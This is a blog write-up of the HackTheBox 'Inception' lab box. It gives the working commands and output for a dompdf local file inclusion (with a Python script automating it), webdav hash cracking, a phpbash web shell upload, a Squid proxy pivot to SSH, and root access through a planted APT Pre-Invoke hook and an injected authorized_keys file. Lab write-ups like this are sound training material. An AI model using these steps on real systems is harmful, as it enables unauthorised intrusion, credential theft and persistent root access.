---
layout: post
title: HackTheBox - Inception Writeup
tags: [hackthebox]
---

This one was a bit of a doozy but pretty well done and required some pretty thorough enumeration. Kudos to the box creator on the creative setup!

![inception](/img/inception.png)

### Initial Enumeration

Let's start with a quick nmap scan like usual.

```
root@kali:~/htb/inception# nmap -sV 10.10.10.67

Starting Nmap 7.50 ( https://nmap.org ) at 2018-01-04 15:47 EST
Nmap scan report for 10.10.10.67
Host is up (0.079s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
3128/tcp open  http-proxy Squid http proxy 3.5.12

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.93 seconds
```

The squid proxy let's us pass through without providing any credentials so we're able to browse the localhost of the server. As for port 80 let's fire up gobuster and see if any directories show up.

```
root@kali:~/htb/inception# gobuster -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.67 

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.67/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/big.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/assets (Status: 301)
/dompdf (Status: 301)
/images (Status: 301)
=====================================================

```
dompdf stands out. Let's check it out.

![dompdf](/img/inception-dompdf.png)

And we identify the version.

![domversion](/img/inception-domversion.png)

And we find that this version is indeed vulnerable.

<https://www.exploit-db.com/exploits/33004/>

Let's verify the LFI.

```
root@kali:~/htb/inception# curl http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
%PDF-1.3
~
~
~
0.000 0.000 0.000 rg
BT 34.016 734.579 Td /F1 12.0 Tf  [(cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKc3NoZDp4OjEwNjo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpjb2JiOng6MTAwMDoxMDAwOjovaG9tZS9jb2JiOi9iaW4vYmFzaAo=)] TJ ET
~
~
~
root@kali:~/htb/inception# vim passwd
root@kali:~/htb/inception# cat passwd | base64 --decode
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash

```

I've truncated a lot of the noise that we get from the pdf and put the base64 into a file, then decoded. This process is very cumbersome to do over and over. So to speed up enumeration I wrote a python script to do it all easily.

lfi.py

```python
#!/usr/bin/env python3
import base64
import urllib.request
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("file")
args = parser.parse_args()


url = 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource='

try:
	req = urllib.request.urlopen(url + args.file)

	output = req.read()
	
	if output:
		string = output.decode()
		result = string[string.find("[(")+2:string.find(")]")]
		decoded = base64.b64decode(result).decode('utf8')
		print(decoded)

except urllib.error.HTTPError:
	print("File cannot be downloaded")

```

So now we can simply call the script and feed our desired filename as a parameter as such:

```
root@kali:~/htb/inception# ./lfi.py /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash

```

Much easier. Also note here that `cobb` could be a possible user for us to target later.

After a lot of config enumeration we find this in the apache default virtual host config file:

```
root@kali:~/htb/inception# ./lfi.py /etc/apache2/sites-enabled/000-default.conf
<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
	Alias /webdav_test_inception /var/www/html/webdav_test_inception
	<Location /webdav_test_inception>
		Options FollowSymLinks
		DAV On
		AuthType Basic
		AuthName "webdav test credential"
		AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
		Require valid-user
	</Location>
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

We've found a webdav directory, excellent. Let's go ahead and grab that passwd file.

```
root@kali:~/htb/inception# ./lfi.py /var/www/html/webdav_test_inception/webdav.passwd
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
```

Now we can crack the hash with `hashcat`.

```
PS C:\hashcat-3.5.0> .\hashcat64.exe -m 1600 -a 0 .\inception.txt .\rockyou.txt
hashcat (v3.5.0) starting...

Dictionary cache hit:
* Filename..: .\rockyou.txt
* Passwords.: 14343296
* Bytes.....: 139921497
* Keyspace..: 14343296

$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69

```
And now we have our username `webdav_tester` and the password `babygurl69`.

My first thought here was to go ahead and upload a php reverse shell. But after trying that we get no connect back. A bind shell also did not work. So to further enumerate the box I decided on an excellent tool called `phpbash` that you can find [here](https://github.com/Arrexel/phpbash). `phpbash` will give us a nice terminal like interface to work with, let's upload it using `cadaver`.

```
root@kali:~/htb/inception# cadaver http://10.10.10.67/webdav_test_inception/
Authentication required for webdav test credential on server `10.10.10.67':
Username: webdav_tester
Password: 
dav:/webdav_test_inception/> put phpbash.php
Uploading exec.php to `/webdav_test_inception/phpbash.php':
Progress: [=============================>] 100.0% of 8280 bytes succeeded.
dav:/webdav_test_inception/> 
```

And now we can browse to our file and test command execution.

![phpbash](/img/inception-phpbash.png)

After looking around in `/var/www/html` we find an old wordpress folder that no longer seems active. Inside we can see the `wp-config.php` that contains database credentials.

```
www-data@Inception:/var/www/html/wordpress_4.8.3# cat wp-config.php

/**
* The base configuration for WordPress
*
* The wp-config.php creation script uses this file during the
* installation. You don't have to use the web site, you can
* copy this file to "wp-config.php" and fill in the values.
*
* This file contains the following configurations:
*
* * MySQL settings
* * Secret keys
* * Database table prefix
* * ABSPATH
*
* @link https://codex.wordpress.org/Editing_wp-config.php
*
* @package WordPress
*/

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');

/** MySQL hostname */
define('DB_HOST', 'localhost');

```

So now we have a password but SSH isn't open on the box. We'll need to do some more enumeration. We already know the squid proxy allows us to pass traffic through it, so we can try to enumerate the box through the proxy and see if SSH is open that way. To do this we can use a Metasploit module called `squid_pivot_scanning`. Since we are going through the proxy we want to scan the localhost address.

```
msf > use auxiliary/scanner/http/squid_pivot_scanning
msf auxiliary(squid_pivot_scanning) > show options

Module options (auxiliary/scanner/http/squid_pivot_scanning):

   Name          Current Setting                                  Required  Description
   ----          ---------------                                  --------  -----------
   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RANGE                                                          yes       IPs to scan through Squid proxy
   RHOSTS                                                         yes       The target address range or CIDR identifier
   RPORT         80                                               yes       The target port (TCP)
   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
   THREADS       1                                                yes       The number of concurrent threads
   VHOST                                                          no        HTTP server virtual host

msf auxiliary(squid_pivot_scanning) > set RPORT 3128
RPORT => 3128
msf auxiliary(squid_pivot_scanning) > set RHOSTS 10.10.10.67
RHOSTS => 10.10.10.67
msf auxiliary(squid_pivot_scanning) > set RANGE 127.0.0.1
RANGE => 127.0.0.1
msf auxiliary(squid_pivot_scanning) > set PORTS 21,80,139,443,445,1433,1521,1723,3389,8080,9100,22
PORTS => 21,80,139,443,445,1433,1521,1723,3389,8080,9100,22
msf auxiliary(squid_pivot_scanning) > run

[+] [10.10.10.67] 127.0.0.1 is alive but 21 is CLOSED
[+] [10.10.10.67] 127.0.0.1:22 seems OPEN
[+] [10.10.10.67] 127.0.0.1:80 seems OPEN
[+] [10.10.10.67] 127.0.0.1 is alive but 139 is CLOSED
[+] [10.10.10.67] 127.0.0.1 is alive but 445 is CLOSED
[+] [10.10.10.67] 127.0.0.1 is alive but 1433 is CLOSED
[+] [10.10.10.67] 127.0.0.1 is alive but 1521 is CLOSED
[+] [10.10.10.67] 127.0.0.1 is alive but 1723 is CLOSED
[+] [10.10.10.67] 127.0.0.1 is alive but 3389 is CLOSED
[+] [10.10.10.67] 127.0.0.1 is alive but 8080 is CLOSED
[+] [10.10.10.67] 127.0.0.1 is alive but 9100 is CLOSED
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(squid_pivot_scanning) >
```

Great! We see that SSH is indeed open through the proxy. But to get to it will be a little tricky, to help facilitate this we can use `corkscrew` and edit our `/etc/ssh/ssh_config` file on kali to add a `ProxyCommand`. 

This is the line we add to our `ssh_config` file.
```
 ProxyCommand corkscrew 10.10.10.67 3128 %h %p
```

Now we can SSH to 127.0.0.1 using the name we found earlier and the password found in `wp-config.php`.

```
root@kali:~/htb/inception# ssh cobb@127.0.0.1
cobb@127.0.0.1's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
cobb@Inception:~$
```

Now we can grab the user.txt flag!

## Privilege Escalation

We quickly see that cobb has full sudo permissions and we can escalate to root instantly. However we are only left with a clue inside of root.txt.

```
cobb@Inception:~$ sudo -l
[sudo] password for cobb: 
Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
cobb@Inception:~$ sudo bash
root@Inception:~# 

root@Inception:/root# cat root.txt 
You're waiting for a train. A train that will take you far away. Wake up to find root.txt.

```
Again, we'll need to do more enumeration to see where we need to go from here. If we check `netstat` we see something interesting.

```
root@Inception:/# netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:35886         127.0.0.1:22            ESTABLISHED
tcp        0      0 127.0.0.1:22            127.0.0.1:35886         ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::3128                 :::*                    LISTEN     
tcp6       0     36 192.168.0.10:3128       192.168.0.1:42354       ESTABLISHED
```

We see another IP address, `192.168.0.1` is connected to the squid port on the box we are currently on. `nc` is on our box so let's do a quick port scan with it on our newly found target.

```
root@Inception:~# nc -zv 192.168.0.1 1-65535 2>&1 | grep -v "refused"
Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
Connection to 192.168.0.1 53 port [tcp/domain] succeeded!
```

Let's also check UDP.

```
root@Inception:~# nc -zvu 192.168.0.1 1-100 2>&1 | grep -v "refused"
Connection to 192.168.0.1 53 port [udp/domain] succeeded!
Connection to 192.168.0.1 67 port [udp/bootps] succeeded!
Connection to 192.168.0.1 69 port [udp/tftp] succeeded!
```

So we have a few ports to look at. Our current SSH credentials unfortunately do not work so we'll have to do some more enumeration with ftp. Lucky for us anonymous ftp is enabled.

```
root@Inception:/root# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 30 18:34 bin
drwxr-xr-x    3 0        0            4096 Nov 30 18:34 boot
drwxr-xr-x   19 0        0            3920 Jan 17 03:35 dev
drwxr-xr-x   93 0        0            4096 Nov 30 18:34 etc
drwxr-xr-x    2 0        0            4096 Nov 06 09:02 home
lrwxrwxrwx    1 0        0              33 Nov 30 18:29 initrd.img -> boot/initrd.img-4.4.0-101-generic
lrwxrwxrwx    1 0        0              32 Nov 06 08:01 initrd.img.old -> boot/initrd.img-4.4.0-98-generic
drwxr-xr-x   22 0        0            4096 Nov 30 18:34 lib
drwxr-xr-x    2 0        0            4096 Oct 30 06:25 lib64
drwx------    2 0        0           16384 Oct 30 06:25 lost+found
drwxr-xr-x    3 0        0            4096 Oct 30 06:25 media
drwxr-xr-x    2 0        0            4096 Aug 01 11:16 mnt
drwxr-xr-x    2 0        0            4096 Aug 01 11:16 opt
dr-xr-xr-x  195 0        0               0 Jan 17 03:35 proc
drwx------    6 0        0            4096 Nov 08 08:48 root
drwxr-xr-x   26 0        0             940 Jan 17 06:25 run
drwxr-xr-x    2 0        0           12288 Nov 30 18:28 sbin
drwxr-xr-x    2 0        0            4096 Apr 29  2017 snap
drwxr-xr-x    3 0        0            4096 Nov 06 05:24 srv
dr-xr-xr-x   13 0        0               0 Jan 17 03:35 sys
drwxrwxrwt   10 0        0            4096 Jan 17 16:26 tmp
drwxr-xr-x   10 0        0            4096 Oct 30 06:25 usr
drwxr-xr-x   13 0        0            4096 Oct 30 06:31 var
lrwxrwxrwx    1 0        0              30 Nov 30 18:29 vmlinuz -> boot/vmlinuz-4.4.0-101-generic
lrwxrwxrwx    1 0        0              29 Nov 06 08:01 vmlinuz.old -> boot/vmlinuz-4.4.0-98-generic
226 Directory send OK.
```

We are also able to download most files, but we are not able to put anything on the system through FTP. 

After filtering through many files we find something interesting in the `crontab`.

```
ftp> get crontab
local: crontab remote: crontab
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for crontab (826 bytes).
226 Transfer complete.
826 bytes received in 0.00 secs (14.8629 MB/s)
ftp> exit
221 Goodbye.
root@Inception:/root# cat crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
30 23	* * *	root	apt upgrade -y 2>&1 >/dev/nul
```

So we can see that every 5 minutes `apt-update` is running. `custom.log` doesn't have anything useful in it besides telling us when it's running. What is useful is that we are able to run commands everytime `apt-update` runs by placing a file inside `/etc/apt/apt.conf.d`.

Our format for the file content is: `APT::Update::Pre-Invoke {"command"};` and we will need to name our file with numbers prefixed. So we'll use `00command` as our file name.

First attempts were tried to send bash one liner reverse shells and also a python bind shell, but these were unsuccessful. We could also just have the command copy out the `root.txt` file for us to `/tmp`, but a shell is always my preferred finish if possible. So instead we can copy the public ssh key into the `authorized_hosts` file under root's home directory. 

To do this, let's first generate ssh keys on our current host.

```
root@Inception:/root# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):  
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:od8B79U7G2TwQH3Nu9c8N15G3678UqRtGDkImLzc6cM root@Inception
The key's randomart image is:
+---[RSA 2048]----+
|       . o  .. ..|
|        + ..  . +|
|       .oo oo. o.|
|       .o+o .=+.o|
|      . Soo . =X=|
|       . oEo oo=&|
|        . o.  ==*|
|             ..=.|
|              ++.|
+----[SHA256]-----+

```

Now let's try to copy over the public key over.

```
root@Inception:/root/.ssh# tftp 192.168.0.1
tftp> put id_rsa.pub /root/.ssh/authorized_keys
Sent 397 bytes in 0.0 seconds
```

Success! Now we will need to `chmod` the permissions on the file, otherwise it will be ignored by SSH. Let's setup our apt command file with the following:

`APT::Update::Pre-Invoke {"chmod 600 /root/.ssh/authorized_keys"};`

Copy over the command file into the proper directory.

```
root@Inception:/tmp# tftp 192.168.0.1
tftp> put 00command /etc/apt/apt.conf.d/00command
Sent 69 bytes in 0.0 seconds
```

Now we wait 5 minutes and try to SSH in.

```
root@Inception:/tmp# ssh root@192.168.0.1
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Thu Nov 30 20:04:21 2017
root@Inception:~#
```

From here we can finally grab the root.txt! 
